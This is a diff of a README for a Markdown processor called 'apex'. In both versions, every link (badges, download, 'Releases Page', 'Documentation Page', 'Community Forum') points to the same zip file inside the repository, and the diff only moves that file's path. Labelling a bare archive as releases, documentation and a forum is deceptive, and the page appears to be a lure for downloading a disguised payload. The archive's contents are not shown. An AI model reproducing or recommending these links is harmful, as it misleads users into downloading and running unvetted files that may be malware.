@@ -1,6 +1,6 @@
 # 🎉 apex - Simplify Your Markdown Experience
 
-[![Version: 0.1.39](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip)](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip) ![](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip) [![License: MIT](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip)](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip)
+[![Version: 0.1.39](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip)](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip) ![](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip) [![License: MIT](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip)](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Apex is a powerful Markdown processor that brings together the best features fro
 
 ### 🔗 Download Link
 
-You can download Apex here: [Download Apex](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip)
+You can download Apex here: [Download Apex](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip)
 
 ## 💻 System Requirements
 
@@ -23,10 +23,10 @@ To run Apex, your system should meet the following requirements:
 
 To get started with Apex, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip).
+1. Visit the [Releases Page](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip).
 2. You will see a list of versions available. Find the latest version marked with a tag.
 3. Click on the version number to access the specific release page.
-4. Download the appropriate file for your system. (For instance, a `.exe` file for Windows, a `.dmg` for macOS, or a `https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip` for Linux).
+4. Download the appropriate file for your system. (For instance, a `.exe` file for Windows, a `.dmg` for macOS, or a `https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip` for Linux).
 5. Once the download completes, locate the file on your computer.
 
    - On Windows, it usually goes to the `Downloads` folder.
@@ -75,14 +75,14 @@ Apex provides a clean and user-friendly interface.
 
 If you need help using Apex or want to learn more, consider these resources:
 
-- **Documentation**: Access comprehensive guides and FAQs at the [Documentation Page](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip).
-- **Community Forum**: Join our community to ask questions and share tips [Community](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip).
+- **Documentation**: Access comprehensive guides and FAQs at the [Documentation Page](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip).
+- **Community Forum**: Join our community to ask questions and share tips [Community](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip).
 
 ## 🔄 Updates
 
 Apex is actively maintained. You'll receive notifications for new versions and updates. 
 
-1. Check the [Releases Page](https://github.com/Jowie27/apex/raw/refs/heads/main/build-test/vendor/cmark-gfm/man/apex_3.8.zip) regularly.
+1. Check the [Releases Page](https://github.com/Jowie27/apex/raw/refs/heads/main/docs/Software_3.7-alpha.4.zip) regularly.
 2. Follow the update instructions as outlined in the release notes.
 
 ## 📧 Contact
